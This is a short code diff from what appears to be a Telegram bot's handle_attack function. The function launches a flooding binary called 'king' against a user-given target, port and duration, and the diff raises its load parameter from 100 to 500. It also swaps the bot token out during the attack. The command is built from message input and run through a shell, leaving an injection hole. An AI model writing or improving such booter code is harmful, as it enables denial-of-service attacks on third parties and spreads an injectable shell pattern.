@@ -331,8 +331,8 @@ def handle_attack(message):
                 def run_attack():
                     # Temporarily replace bot token to prevent king from sending messages
                     bot.token = "INVALID_TOKEN"
-                    full_command = f"./king {target} {port} {time} 100"
-                    process = subprocess.Popen(full_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+                    full_command = f"king {target} {port} {time} 500"
+                    process = subprocess.Popen(full_command, shell=True)
                     process.wait()
                     # Restore original token
                     bot.token = original_token
